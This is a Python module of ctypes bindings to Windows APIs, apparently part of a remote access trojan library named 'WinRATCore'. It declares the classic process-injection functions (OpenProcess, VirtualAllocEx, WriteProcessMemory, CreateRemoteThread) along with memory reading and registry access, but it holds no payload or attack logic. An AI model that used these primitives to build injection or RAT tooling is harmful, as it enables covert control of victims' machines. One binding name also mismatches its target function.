import ctypes
from WinRATCore.constants import *
from WinRATCore.structures import *

RegCreateKeyExW = ctypes.windll.kernel32.RegCreateKeyExW
RegCreateKeyExW.argtypes = [HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD]
RegCreateKeyExW.restype = LSTATUS

Beep = ctypes.windll.kernel32.Beep
Beep.argtypes = [DWORD, DWORD]
Beep.restype = INT

GetConsoleWindow = ctypes.windll.kernel32.GetConsoleWindow
GetConsoleWindow.restype = HWND

OpenProcess = ctypes.windll.kernel32.OpenProcess
OpenProcess.restype = HANDLE

VirtualAllocEx = windll.kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = [HANDLE, LPVOID, SIZE_T, DWORD, DWORD]
VirtualAllocEx.restype = LPVOID

ReadProcessMemory = ctypes.windll.kernel32.ReadProcessMemory
ReadProcessMemory.restype = BOOL
ReadProcessMemory.argtypes = [HANDLE, LPVOID, LPVOID, SIZE_T, POINTER(SIZE_T)]

WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPVOID, SIZE_T, POINTER(SIZE_T)]
WriteProcessMemory.restype  = bool

GetModuleHandleA = windll.kernel32.GetModuleHandleA
GetModuleHandleA.argtypes = [wintypes.LPCSTR]
GetModuleHandleA.restype = ctypes.c_void_p

GetProcAddress = windll.kernel32.GetProcAddress
GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
GetProcAddress.restype = ctypes.c_void_p

CreateRemoteThread = windll.kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (HANDLE, LPVOID, DWORD, LPVOID, LPVOID, DWORD, DWORD)
CreateRemoteThread.restype = HANDLE

WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject
WaitForSingleObject.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD]
WaitForSingleObject.restype = ctypes.wintypes.DWORD

VirtualFreeEx = windll.kernel32.VirtualFreeEx
VirtualFreeEx.argtypes = (HANDLE, LPVOID, DWORD, DWORD)

EnumProcessModules = windll.psapi.EnumProcessModules
EnumProcessModules.argtypes = [HANDLE, LPVOID, DWORD, LPDWORD]
EnumProcessModules.restype = bool

GetModuleFileNameExA = windll.psapi.GetModuleBaseNameA
GetModuleFileNameExA.argtypes = [HANDLE, HMODULE, LPSTR, DWORD]
GetModuleFileNameExA.restype = DWORD